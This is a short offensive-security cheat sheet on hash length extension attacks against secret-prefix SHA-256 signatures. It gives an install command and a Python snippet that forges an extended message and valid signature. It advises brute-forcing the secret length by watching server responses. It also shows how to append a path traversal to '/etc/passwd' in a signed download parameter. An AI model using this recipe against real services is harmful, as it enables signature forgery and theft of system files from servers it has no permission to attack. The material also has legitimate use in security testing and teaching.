# Hash Length Extension Attack

If a signature is built as `sig = sha256(SECRET + data)` (secret-prefix MAC instead of HMAC), you can append attacker-controlled data and forge a valid signature for the new blob — without knowing the secret, as long as you know its length.

```bash
pip install length-extension-tool
```
```python
from hashtools import HashTools
new_msg, new_sig = HashTools.new("sha256").extension(
    secret_length=<klen>,            # brute-force 1..32 if unknown; a 200 response marks the right length
    original_data=b"<known-signed-value>",
    append_data=b"<payload-to-append>",
    signature="<known-sig-for-original_data>",
)
```
Send `new_msg` (URL-encoded, keeps the raw SHA-256 padding bytes) with `new_sig` in place of the original value/signature pair. Common use: turn a signed filename into `filename\x80\x00...\x00<bitlen>../../../etc/passwd` to add path traversal to an otherwise-validated download parameter.
